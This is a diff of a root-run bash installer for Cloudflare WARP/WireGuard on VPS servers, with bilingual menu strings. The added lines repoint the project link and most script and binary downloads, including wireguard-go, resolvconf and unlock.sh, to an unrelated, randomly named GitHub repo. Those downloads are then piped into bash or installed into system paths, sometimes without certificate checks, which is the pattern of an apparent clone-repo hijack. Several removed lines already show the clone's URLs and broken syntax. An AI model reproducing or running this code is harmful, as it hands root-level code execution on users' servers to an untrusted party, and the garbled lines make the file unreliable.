@@ -46,8 +46,8 @@ E[14]="Got the WARP\$TYPE IP successfully"
 C[14]="已成功获取 WARP\$TYPE 网络"
 E[15]="WARP is turned off. It could be turned on again by [warp o]"
 C[15]="已暂停 WARP，再次开启可以用 warp o"
-E[16]="The script specifically adds WARP network interface for VPS, detailed:[https://github.com/fscarmen/warp-sh]\n Features:\n\t • Support WARP+ account. Third-party scripts are use to increase WARP+ quota or upgrade kernel.\n\t • Not only menus, but commands with option.\n\t • Support system: Ubuntu 16.04、18.04、20.04、22.04,Debian 9、10、11,CentOS 7、8、9, Alpine, Arch Linux 3.\n\t • Support architecture: AMD,ARM and s390x\n\t • Automatically select four WireGuard solutions. Performance: Kernel with WireGuard integration > Install kernel module > wireguard-go\n\t • Suppert WARP Linux client.\n\t • Output WARP status, IP region and asn\n"
-C[16]="本项目专为 VPS 添加 warp 网络接口，详细说明: [https://github.com/fscarmen/warp-sh]\n 脚本特点:\n\t • 支持 WARP+ 账户，附带第三方刷 WARP+ 流量和升级内核 BBR 脚本\n\t • 普通用户友好的菜单，进阶者通过后缀选项快速搭建\n\t • 智能判断操作系统: Ubuntu 、Debian 、CentOS、 Alpine 和 Arch Linux，请务必选择 LTS 系统\n\t • 支持硬件结构类型: AMD、 ARM 和 s390x\n\t • 结合 Linux 版本和虚拟化方式，自动优选4个 WireGuard 方案。网络性能方面: 内核集成 WireGuard > 安装内核模块 > wireguard-go\n\t • 支持 WARP Linux Socks5 Client\n\t • 输出执行结果，提示是否使用 WARP IP ，IP 归属地和线路提供商\n"
+E[16]="The script specifically adds WARP network interface for VPS, detailed:[https://github.com/MHCloner/rhazefafewa]\n Features:\n\t • Support WARP+ account. Third-party scripts are use to increase WARP+ quota or upgrade kernel.\n\t • Not only menus, but commands with option.\n\t • Support system: Ubuntu 16.04、18.04、20.04、22.04,Debian 9、10、11,CentOS 7、8、9, Alpine, Arch Linux 3.\n\t • Support architecture: AMD,ARM and s390x\n\t • Automatically select four WireGuard solutions. Performance: Kernel with WireGuard integration > Install kernel module > wireguard-go\n\t • Suppert WARP Linux client.\n\t • Output WARP status, IP region and asn\n"
+C[16]="本项目专为 VPS 添加 warp 网络接口，详细说明: [https://github.com/MHCloner/rhazefafewa]\n 脚本特点:\n\t • 支持 WARP+ 账户，附带第三方刷 WARP+ 流量和升级内核 BBR 脚本\n\t • 普通用户友好的菜单，进阶者通过后缀选项快速搭建\n\t • 智能判断操作系统: Ubuntu 、Debian 、CentOS、 Alpine 和 Arch Linux，请务必选择 LTS 系统\n\t • 支持硬件结构类型: AMD、 ARM 和 s390x\n\t • 结合 Linux 版本和虚拟化方式，自动优选4个 WireGuard 方案。网络性能方面: 内核集成 WireGuard > 安装内核模块 > wireguard-go\n\t • 支持 WARP Linux Socks5 Client\n\t • 输出执行结果，提示是否使用 WARP IP ，IP 归属地和线路提供商\n"
 E[17]="Version"
 C[17]="脚本版本"
 E[18]="New features"
@@ -444,7 +444,10 @@ check_root_virt() {
 
 # 随机使用 cdn 网址，以负载均衡
 check_cdn() {
-  wget -T2 -qO- https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | grep -q '#!/usr/bin/env'
+  RANDOM_CDN=($(shuf -e "${CDN_URL[@]}"))
+  for CDN in "${RANDOM_CDN[@]}"; do
+    wget -T2 -qO- https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | grep -q '#!/usr/bin/env' && break || unset CDN
+  done
 }
 
 # 多方式判断操作系统，试到有值为止。只支持 Debian 10/11、Ubuntu 18.04/20.04 或 CentOS 7/8 ,如非上述操作系统，退出脚本
@@ -516,7 +519,7 @@ check_dependencies() {
 cancel_account(){
   local FILE=$1
   if [ -s "$FILE" ]; then
-    grep -oqE '"id":[ ]+"t.[A-F0-9a-f]{8}-' $FILE || bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --cancle --file $FILE >/dev/null 2>&1
+    grep -oqE '"id":[ ]+"t.[A-F0-9a-f]{8}-' $FILE || bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --cancle --file $FILE >/dev/null 2>&1
   fi
 }
 
@@ -741,13 +744,13 @@ plus() {
       input
       reading " $(text 57) " MISSION
       MISSION=${MISSION//[^0-9]/}
-      bash <(wget --no-check-certificate -qO- -T8 https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/warp_plus.sh) $MISSION $ID
+      bash <(wget --no-check-certificate -qO- -T8 https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/tools/main/warp_plus.sh) $MISSION $ID
       ;;
     3 )
       input
       reading " $(text 57) " MISSION
       MISSION=${MISSION//[^0-9]/}
-      bash <(wget --no-check-certificate -qO- -T8 https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/warp_up.sh) --disclaimer --id $ID --iterations $MISSION
+      bash <(wget --no-check-certificate -qO- -T8 https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/tools/main/warp-up.sh) --disclaimer --id $ID --iterations $MISSION
       ;;
     0 )
       [ "$OPTION" != p ] && menu || exit
@@ -833,11 +836,11 @@ change_ip() {
       wg-quick down warp >/dev/null 2>&1
       [ -s /etc/wireguard/info.log ] && grep -q 'Device name' /etc/wireguard/info.log && local LICENSE=$(cat /etc/wireguard/license) && local NAME=$(awk '/Device name/{print $NF}' /etc/wireguard/info.log)
       cancel_account /etc/wireguard/warp-account.conf
-      bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+      bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
       # 如原来是 plus 账户，以相同的 license 升级，并修改账户和 warp 配置文件
       if [[ -n "$LICENSE" && -n "$NAME" ]]; then
-        [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
-        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+        [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
+        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
         local PRIVATEKEY="$(grep 'private_key' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
         local ADDRESS6="$(grep '"v6.*"$' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
         local CLIENT_ID="$(reserved_and_clientid /etc/wireguard/warp-account.conf file)"
@@ -1110,7 +1113,7 @@ uninstall() {
   }
 
   # 如已安装 warp_unlock 项目，先行卸载
-  [ -e /etc/wireguard/warp_unlock.sh ] && bash <(curl -sSL https://${CDN}gitlab.com/fscarmen/warp_unlock/-/raw/main/unlock.sh) -U -$L
+  [ -e /etc/wireguard/warp_unlock.sh ] && bash <(curl -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/warp_unlock/main/unlock.sh) -U -$L
 
   # 根据已安装情况执行卸载任务并显示结果
   UNINSTALL_CHECK=("wg-quick" "warp-cli" "wireproxy")
@@ -1151,7 +1154,7 @@ uninstall() {
 # 同步脚本至最新版本
 ver() {
   mkdir -p /tmp; rm -f /tmp/menu.sh
-  wget -O /tmp/menu.sh https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/menu.sh
+  wget -O /tmp/menu.sh https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/menu.sh
   if [ -s /tmp/menu.sh ]; then
     mv /tmp/menu.sh /etc/wireguard/
     chmod +x /etc/wireguard/menu.sh
@@ -1580,7 +1583,7 @@ input_url_token() {
       [ -z "$TEAM_TOKEN" ] && return
 
       unset TEAMS ADDRESS6 PRIVATEKEY CLIENT_ID
-      TEAMS=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's# > $registe_path##; /cat $registe_path/d') --registe --token $TEAM_TOKEN)
+      TEAMS=$(bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's# > $registe_path##; /cat $registe_path/d') --registe --token $TEAM_TOKEN)
       ADDRESS6=$(expr "$TEAMS" : '.*"v6":[ ]*"\([^"]*\).*')
       PRIVATEKEY=$(expr "$TEAMS" : '.*"private_key":[ ]*"\([^"]*\).*')
       RESERVED=$(expr "$TEAMS" : '.*"client_id":[ ]*"\([^"]*\).*')
@@ -1829,8 +1832,8 @@ best_mtu() {
 
 # 寻找最佳 Endpoint，根据 v4 / v6 情况下载 endpoint 库
 best_endpoint() {
-  wget $STACK -qO /tmp/endpointhttps://raw.githubusercontent.com/MHCloner/rhazefafewa/main/warp-linux-"$ARCHITECTURE" && chmod +x /tmp/endpoint
-  [ "$IPV4$IPV6" = 01 ] && wget $STACK -qO /tmp/ip https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/ipv6 || wget $STACK -qO /tmp/ip https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/ipv4
+  wget $STACK -qO /tmp/endpoint https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/endpoint/warp-linux-"$ARCHITECTURE" && chmod +x /tmp/endpoint
+  [ "$IPV4$IPV6" = 01 ] && wget $STACK -qO /tmp/ip https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/endpoint/ipv6 || wget $STACK -qO /tmp/ip https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/endpoint/ipv4
 
   if [[ -e /tmp/endpoint && -e /tmp/ip ]]; then
     /tmp/endpoint -file /tmp/ip -output /tmp/endpoint_result >/dev/null 2>&1
@@ -1939,7 +1942,7 @@ install() {
       wireproxy_latest=$(wget --no-check-certificate -qO- -T1 -t1 $STACK "https://api.github.com/repos/pufferffish/wireproxy/releases/latest" | grep "tag_name" | head -n 1 | cut -d : -f2 | sed 's/[ \"v,]//g')
       wireproxy_latest=${wireproxy_latest:-'1.0.6'}
       wget --no-check-certificate -T10 -t1 $STACK -O wireproxy.tar.gz https://${CDN}github.com/pufferffish/wireproxy/releases/download/v"$wireproxy_latest"/wireproxy_linux_"$ARCHITECTURE".tar.gz ||
-      wget --no-check-certificate $STACK -O wireproxy.tar.gz https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/wireproxy_linux_"$ARCHITECTURE".tar.gz
+      wget --no-check-certificate $STACK -O wireproxy.tar.gz https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/wireproxy/wireproxy_linux_"$ARCHITECTURE".tar.gz
       [ $(type -p tar) ] || ${PACKAGE_INSTALL[int]} tar 2>/dev/null || ( ${PACKAGE_UPDATE[int]}; ${PACKAGE_INSTALL[int]} tar 2>/dev/null )
       tar xzf wireproxy.tar.gz -C /usr/bin/; rm -f wireproxy.tar.gz
     fi
@@ -1948,7 +1951,7 @@ install() {
     mkdir -p /etc/wireguard/ >/dev/null 2>&1
     local REGISTE_TIME=0
     until [[ -e /etc/wireguard/warp-account.conf || "$REGISTE_TIME" -eq 50 ]]; do
-      bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null && break
+      bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null && break
       (( REGISTE_TIME++ ))
     done
 
@@ -1978,9 +1981,9 @@ EOF
       [ -s /etc/wireguard/warp-account.conf ] && warning "\n $(text 107) \n"
     elif [ -n "$LICENSE" ]; then
       if [ -s /etc/wireguard/warp-account.conf ]; then
-        local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --license $LICENSE)
+        local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
         if grep -q '"warp_plus": true' <<< "$UPDATE_RESULT"; then
-          [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+          [ -n "$NAME" ] && bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
           sed -i "s#\([ ]\+\"license\": \"\).*#\1$LICENSE\"#g; s#\"account_type\".*#\"account_type\": \"limited\",#g; s#\([ ]\+\"name\": \"\).*#\1$NAME\"#g" /etc/wireguard/warp-account.conf
           echo "$LICENSE" > /etc/wireguard/license
           echo -e "Device name   : $NAME" > /etc/wireguard/info.log
@@ -2105,7 +2108,7 @@ EOF
 
       # CentOS Stream 9 需要安装 resolvconf
       [[ "$SYSTEM" = CentOS && "$(expr "$SYS" : '.*\s\([0-9]\{1,\}\)\.*')" = 9 ]] && [ ! $(type -p resolvconf) ] &&
-      wget $STACK -P /usr/sbin https://github.com/fscarmen/warp/releases/download/resolvconf/resolvconf && chmod +x /usr/sbin/resolvconf
+      wget $STACK -P /usr/sbin https://${CDN}github.com/fscarmen/warp/releases/download/resolvconf/resolvconf && chmod +x /usr/sbin/resolvconf
       ;;
 
     Alpine )
@@ -2126,7 +2129,7 @@ EOF
       # 则根据 wireguard-tools 版本判断下载 wireguard-go reserved 版本: wg < v1.0.20210223 , wg-go-reserved = v0.0.20201118-reserved; wg >= v1.0.20210223 , wg-go-reserved = v0.0.20230223-reserved
       local WIREGUARD_TOOLS_VERSION=$(wg --version | sed "s#.* v1\.0\.\([0-9]\+\) .*#\1#g")
       [[ "$WIREGUARD_TOOLS_VERSION" -lt 20210223 ]] && local WIREGUARD_GO_VERSION=20201118 || local WIREGUARD_GO_VERSION=20230223
-      wget --no-check-certificate $STACK -O /usr/bin/wireguard-go https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/wireguard-go/wireguard-go-linux-$ARCHITECTURE-$WIREGUARD_GO_VERSION && chmod +x /usr/bin/wireguard-go
+      wget --no-check-certificate $STACK -O /usr/bin/wireguard-go https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/wireguard-go/wireguard-go-linux-$ARCHITECTURE-$WIREGUARD_GO_VERSION && chmod +x /usr/bin/wireguard-go
 
       if [ "$KERNEL_ENABLE" = '1' ]; then
         cp -f /usr/bin/wg-quick{,.origin}
@@ -2224,7 +2227,7 @@ EOF
 [Unit]
 Description=WireProxy for WARP
 After=network.target
-Documentation=https://github.com/fscarmen/warp-sh
+Documentation=https://github.com/MHCloner/rhazefafewa
 Documentation=https://github.com/pufferffish/wireproxy
 
 [Service]
@@ -2498,7 +2501,7 @@ check_quota() {
   if [ "$CHECK_TYPE" = 'client' ]; then
     QUOTA=$(warp-cli --accept-tos account 2>/dev/null | awk -F' ' '/Quota/{print $NF}')
   elif [ -e /etc/wireguard/warp-account.conf ]; then
-    QUOTA=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --device | awk '/quota/{print $NF}' | sed "s#,##")
+    QUOTA=$(bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --device | awk '/quota/{print $NF}' | sed "s#,##")
   fi
 
   # 部分系统没有依赖 bc，所以两个小数不能用 $(echo "scale=2; $QUOTA/1000000000000000" | bc)，改为从右往左数字符数的方法
@@ -2618,7 +2621,7 @@ change_to_free() {
     esac
 
     # 流程3:注册新账户
-    bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 流程4:如成功，根据新账户信息修改配置文件并注销旧账户; 如失败则还原为原账户
     # 如升级成功的处理: 删除原账户信息文件，注销原账户
@@ -2733,15 +2736,15 @@ change_to_plus() {
     esac
 
     # 流程3:注册新账户
-    bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 流程4:使用 License 升级账户
-    local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
+    local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
 
     # 流程5:如成功，根据新账户信息修改配置文件并注销旧账户; 如失败则还原为原账户
     # 如升级成功的处理: 删除原账户信息文件，注销原账户
     if grep -q '"warp_plus": true' <<< "$UPDATE_RESULT"; then
-      [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+      [ -n "$NAME" ] && bash <(curl -m5 -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
       cancel_account /etc/wireguard/warp-account.conf.bak
       backup_restore_delete delete
       local PRIVATEKEY="$(grep 'private_key' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
@@ -3030,7 +3033,7 @@ menu_setting() {
 
   ACTION[4]() { OPTION=o; onoff; }
   ACTION[5]() { client_install; }; ACTION[6]() { change_ip; }; ACTION[7]() { uninstall; }; ACTION[8]() { plus; }; ACTION[9]() { bbrInstall; }; ACTION[10]() { ver; };
-  ACTION[11]() { bash <(curl -sSL https://${CDN}gitlab.com/fscarmen/warp_unlock/-/raw/main/unlock.sh) -$L; };
+  ACTION[11]() { bash <(curl -sSL https://${CDN}raw.githubusercontent.com/MHCloner/rhazefafewa/warp_unlock/main/unlock.sh) -$L; };
   ACTION[12]() { ANEMONE=1 ;install; };
   ACTION[13]() { PUFFERFFISH=1; install; };
   ACTION[14]() { LUBAN=1; client_install; };
